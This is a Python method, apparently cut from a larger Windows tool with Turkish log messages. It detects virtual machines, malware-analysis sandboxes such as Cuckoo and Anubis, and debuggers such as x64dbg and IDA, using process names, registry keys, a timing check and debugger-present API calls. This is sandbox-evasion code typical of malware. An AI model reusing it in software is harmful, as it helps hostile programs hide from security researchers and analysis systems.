    def detect_vm_sandbox_debugger(self):
        
        try:
            # VM Detection
            vm_indicators = [
                'VMware', 'VBox', 'Virtual', 'QEMU', 'Xen', 'Parallels',
                'VMware Tools', 'VBoxGuestAdditions', 'VMware SVGA',
                'VMware Inc.', 'Oracle Corporation', 'Parallels Inc.'
            ]
            
            # Sandbox Detection
            sandbox_indicators = [
                'Cuckoo', 'Anubis', 'Joe', 'Norman', 'Comodo', 'ThreatExpert',
                'sandbox', 'malware', 'analysis', 'detection'
            ]
            
            # Debugger Detection
            debugger_indicators = [
                'ollydbg', 'x64dbg', 'windbg', 'ida', 'ghidra', 'radare2',
                'debugger', 'analyzer', 'disassembler'
            ]
            
            import psutil
            for proc in psutil.process_iter(['pid', 'name', 'exe']):
                try:
                    proc_name = proc.info['name'].lower()
                    proc_exe = proc.info['exe'] or ''
                    
                    # VM Detection
                    for vm_indicator in vm_indicators:
                        if vm_indicator.lower() in proc_name or vm_indicator.lower() in proc_exe.lower():
                            self.debug_log(f'VM tespit: {proc_name}')
                            return True
                    
                    # Sandbox Detection
                    for sandbox_indicator in sandbox_indicators:
                        if sandbox_indicator.lower() in proc_name or sandbox_indicator.lower() in proc_exe.lower():
                            self.debug_log(f'Sandbox tespit: {proc_name}')
                            return True
                    
                    # Debugger Detection
                    for debugger_indicator in debugger_indicators:
                        if debugger_indicator.lower() in proc_name or debugger_indicator.lower() in proc_exe.lower():
                            self.debug_log(f'Debugger tespit: {proc_name}')
                            return True
                            
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            try:
                import winreg
                
                # VM Registry keys
                vm_registry_keys = [
                    (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\Class\{4D36E968-E325-11CE-BFC1-08002BE10318}\0000"),
                    (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\Class\{4D36E968-E325-11CE-BFC1-08002BE10318}\0001"),
                    (winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DEVICEMAP\Scsi"),
                    (winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\Description\System")
                ]
                
                for hive, key_path in vm_registry_keys:
                    try:
                        key = winreg.OpenKey(hive, key_path, 0, winreg.KEY_READ)
                        try:
                            value, _ = winreg.QueryValueEx(key, "ProviderName")
                            if any(vm_indicator.lower() in value.lower() for vm_indicator in vm_indicators):
                                self.debug_log(f'VM Registry tespit: {value}')
                                winreg.CloseKey(key)
                                return True
                        except FileNotFoundError:
                            pass
                        winreg.CloseKey(key)
                    except Exception:
                        continue
                        
            except Exception as e:
                self.debug_log(f'Registry: {e}')
            
        
            import time
            start_time = time.time()
            time.sleep(0.1)  
            elapsed_time = time.time() - start_time
            
            if elapsed_time > 0.2:  
                self.debug_log(f'Timing check: Sandbo ({elapsed_time:.3f}s)')
                return True
            
            try:
                import ctypes
                kernel32 = ctypes.windll.kernel32
                
                # IsDebuggerPresent check
                if kernel32.IsDebuggerPresent():
                    self.debug_log('Debugger tespit: IsDebuggerPresent')
                    return True
                    
                # CheckRemoteDebuggerPresent check
                is_debugger = ctypes.c_bool()
                kernel32.CheckRemoteDebuggerPresent(kernel32.GetCurrentProcess(), ctypes.byref(is_debugger))
                if is_debugger.value:
                    self.debug_log('Debugger tespit: CheckRemoteDebuggerPresent')
                    return True
                    
            except Exception as e:
                self.debug_log(f'Memory check: {e}')
            
            self.debug_log('VM/Sandbox/Debugger tespit edilmedi')
            return False
            
        except Exception as e:
            self.debug_log(f'Detection: {e}')
            return False  

